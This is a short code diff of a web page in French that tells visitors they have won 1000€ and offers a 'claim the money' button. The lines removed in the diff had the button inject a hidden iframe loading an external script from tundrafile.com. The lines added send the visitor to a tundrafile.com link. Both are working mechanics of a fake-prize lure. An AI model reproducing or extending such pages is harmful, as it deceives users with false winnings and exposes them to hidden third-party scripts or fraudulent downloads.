@@ -82,8 +82,8 @@
 
 <div id="popup">
     <div id="popupContent">
-        <p>Bravo, vous avez gagné 1000€.</p>
-        <button id="okButton">Reclamer L'argent</button>
+        <p>Bravo vous avez gagné 1000€ !</p>
+        <button id="okButton">Réclamer l'argent</button>
     </div>
 </div>
 
@@ -112,13 +112,7 @@ button.addEventListener('click', () => {
 });
 
 okButton.addEventListener('click', () => {
-    // Crée un iframe invisible pour exécuter le script externe
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = "https://tundrafile.com/script_include.php?id=1840363";
-    document.body.appendChild(iframe);
-
-    popup.style.display = 'none';
+    window.location.href = "https://tundrafile.com/1840369";
 });
 
 window.addEventListener('load', moveButton);
